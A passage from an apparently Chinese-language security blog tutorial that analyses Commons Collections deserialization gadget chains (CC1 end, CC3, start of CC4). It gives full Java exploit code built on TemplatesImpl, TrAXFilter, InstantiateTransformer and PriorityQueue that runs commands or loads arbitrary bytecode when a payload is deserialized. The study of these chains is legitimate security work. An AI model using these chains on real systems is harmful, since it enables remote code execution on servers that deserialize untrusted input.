alt="image">​</p><p>但是这里反序列化还是不会执行，为什么呢？通过调试我们发现他在<code>LazyMap#get()</code>​方法的时候最后会把key return回去</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540785.png" alt="image">​</p><p>那也就是说在put方法之后我们去把这个key给<code>remote</code>​掉就好了</p><p>最终exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>       HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>       <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aa&quot;</span>);<br>       HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>       lazyMap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>       <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>       factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>       factoryfield.set(lazyMap,chainedTransformer);<br><br>       serialize(map2);<br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540118.png" alt="image">​</p><p>‍</p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>‍</p><p>CC3其实后半段就是动态类加载，其实就是跟<code>Fastjson</code>​的&lt;&#x3D;1.2.24的Jdk7u21链子是一样的，(因为我先学了fastjson)</p><h2 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h2><p>‍</p><h3 id="TemplatesImpl-TransletClassLoader-defineClass-​​"><a href="#TemplatesImpl-TransletClassLoader-defineClass-​​" class="headerlink" title="TemplatesImpl.TransletClassLoader#defineClass()​​"></a><code>TemplatesImpl.TransletClassLoader#defineClass()</code>​​</h3><p>因为要找<code>defineclass</code>​重写过的方法，所以这条链子的作者在<code>rt.jar</code>​中找到了defineClass <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540242.png" alt="image">​</p><p>‍</p><h3 id="TemplatesImpl-defineTransletClasses-​​"><a href="#TemplatesImpl-defineTransletClasses-​​" class="headerlink" title="TemplatesImpl#defineTransletClasses()​​"></a><code>TemplatesImpl#defineTransletClasses()</code>​​</h3><p>但是在实际场景中，因为defineClass方法作用域却是不开放的(就是并不是public方法，所以需要找谁去调用了他)，所以我们很很难直接利用到它所以我们要去找谁调用了这个<code>defineClass</code>​函数 ，于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540388.png" alt="image">​</p><h3 id="TemplatesImpl-getTransletInstance-​​"><a href="#TemplatesImpl-getTransletInstance-​​" class="headerlink" title="TemplatesImpl#getTransletInstance()​​"></a><code>TemplatesImpl#getTransletInstance()</code>​​</h3><p>再往上找看哪里是<code>public</code>​属性的方法调用了他，并且在上述方法中是对字节码进行了加载，并没有初始化，所以要找到链子的某个地方进行了初始化并且最终的入口方法是public方法，最后作者在这里找到了</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540570.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540723.png" alt="image">​</p><p>可以看到在加载了<code>_class</code>​属性后进行了<code>.newInstance()</code>​初始化，完全符合我们的要求</p><p>但是他仍然是私有方法</p><h3 id="TemplatesImpl-newTransformer-​​"><a href="#TemplatesImpl-newTransformer-​​" class="headerlink" title="TemplatesImpl#newTransformer()​​"></a><code>TemplatesImpl#newTransformer()</code>​​</h3><p>所以继续往上找于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111540902.png" alt="image">​</p><p>‍</p><p>所以我们先来写一个demo(因为<code>_tfactory</code>​在反序列化的时候会自动实例化赋值，但是直接调用并不会所以这里写demo的时候需要自行加上才能执行成功)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>     <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>     bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>     <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>     <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br><br>     bytecodesField.set(templates, codes);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>     nameField.setAccessible(<span class="hljs-literal">true</span>);<br>     nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">_tfField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>     _tfField.setAccessible(<span class="hljs-literal">true</span>);<br>     _tfField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>     templates.newTransformer();<br></code></pre></td></tr></table></figure><p>‍</p><p>这里有个要注意的点</p><ul><li>455行会去进行强制类型转换为<code>AbstractTranslet</code>​类，那我们是不是要传该类进来呢？</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541055.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541244.png" alt="image">​</p><p>在这个地方他会去判断这个父类是否为 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>​</p><p>所以加载的字节码文件要是集成了<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>​这个的类</p><ul><li>这里<code> _bytecodes</code>​ 不能为空</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541390.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541524.png" alt="image">​</p><p>‍</p><p>那么后半段执行代码的点就可以修改了，其实跟CC1基本都不变，只是修改了一下执行代码的形式，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">_tfField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>_tfField.setAccessible(<span class="hljs-literal">true</span>);<br>_tfField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>  <br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)&#125;;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>cls.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br><br>serialize(o);<br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>‍</p><p>上述其实是去找谁去调用了<code>newTransformer()</code>​导致可以连接上动态类加载的<code>TemplatesImpl</code>​链，所以想到了<code>InvokerTransformer</code>​当中的类似反射的代码来完成调用但是如果<code>InvokerTransformer</code>​被ban了，才到真正的CC3 ，因为是绕过了<code>InvokerTransformer</code>​的限制，采用了另一条链子</p><p>‍</p><p>作者继续往上跟看谁调用了<code>newTransformer()</code>​，于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.java</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541657.png" alt="image">​</p><p><code>TrAXFilter</code>​这个类是直接传入Templates类后调用的构造方法就调用了<code>newTransformer()</code>​方法，也就是说只要找到一个地方可以调用<code>TrAXFilter</code>​他的构造方法 ，就可以成功连接上动态类加载的后半条链子了</p><p>‍</p><p>于是作者找到了<code>\commons-collections-3.2.1.jar!\org\apache\commons\collections\functors\InstantiateTransformer.java</code>​</p><p>看一下他的<code>transform</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541826.png" alt="image">​</p><p>那么我们就可以根据其构造方法去构造，然后通过之前的办法去调用其<code>transform</code>​即可全部连接起来</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541977.png" alt="image">​</p><p>‍</p><p>写出以下demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">_tfField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>_tfField.setAccessible(<span class="hljs-literal">true</span>);<br>_tfField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>instantiateTransformer.transform(TrAXFilter.class);<br></code></pre></td></tr></table></figure><p>这样其实就可以调用<code>TrAXFilter</code>​的构造方法了，那么现在就是去整条链子串起来即可</p><p>最后exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>                &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>        cls.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br></code></pre></td></tr></table></figure><p>其实就是利用了<code>InstantiateTransformer</code>​可以执行构造方法拼接了一下后续的动态类加载这样的思路</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541105.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>从CC4开始就要换依赖了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="TransformingComparator-compare-​​​"><a href="#TransformingComparator-compare-​​​" class="headerlink" title="TransformingComparator#compare()​​​"></a><code>TransformingComparator#compare()</code>​​​</h3><p>其实在CC4中也是没有变化太多，而是新引入了一个CC4的包，跟原来CC1的包进行了拼接，那么作者其实是在CC4的包中去寻找调用<code>transform</code>​方法的类，在</p><p><code>commons-collections4-4.0.jar!\org\apache\commons\collections4\comparators\TransformingComparator#compare()</code>​中找到了调用<code>transform</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541253.png" alt="image">​</p><p>这里也是说的很模糊，反正就是看谁去调用了这个<code>compare</code>​方法，于是找到了</p><p>‍</p><h3 id="PriorityQueue-siftDownUsingComparator-​​​"><a href="#PriorityQueue-siftDownUsingComparator-​​​" class="headerlink" title="PriorityQueue#siftDownUsingComparator()​​​"></a><code>PriorityQueue#siftDownUsingComparator()</code>​​​</h3><p><code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#siftDownUsingComparator()</code>​调用了<code>compare</code>​方法</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541420.png" alt="image">​</p><p>‍</p><p>再往上跟就是谁去调用了<code>siftDownUsingComparator</code>​ ，找到的是  <code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#siftDown</code>​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541591.png" alt="image">​</p><p>‍</p><p>继续往上跟 找到的是 <code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#heapify()</code>​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541736.png" alt="image">​</p><h3 id="PriorityQueue-readObject-​​​"><a href="#PriorityQueue-readObject-​​​" class="headerlink" title="PriorityQueue#readObject()​​​"></a><code>PriorityQueue#readObject()</code>​​​</h3><p>继续往上跟 就是<code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#readObject()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541862.png" alt="image">​</p><p>‍</p><p>至此就跟到<code>readObject</code>​结束了，所以只需要一个入口类去触发这个<code>readObject</code>​方法即可传入，那么接下里就是构造EXP了</p><p>‍</p><p>这里有几个要注意的点</p><ul><li>这里的<code>site</code>​必须为两个否则进不去这个<code>siftDown</code>​方法中</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541009.png" alt="image">​</p><p>‍</p><ul><li>其实他在<code>add</code>​方法的时候也会去调用<code>compare</code>​方法，所以跟URLDNS或者CC3一样都要去反射把值修改一下</li></ul><p>‍</p><ul><li>CC4跟CC3的包其实更新了一个版本后在<code>TransformingComparator</code>​中是有改变的，在CC4中这个类继承了<code>Serializable</code>​接口导致可以序列化</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541160.png" alt="image">​</p><p>而在CC3中是并没有进行序列化的继承的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541405.png" alt="image">​</p><p>最后的EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        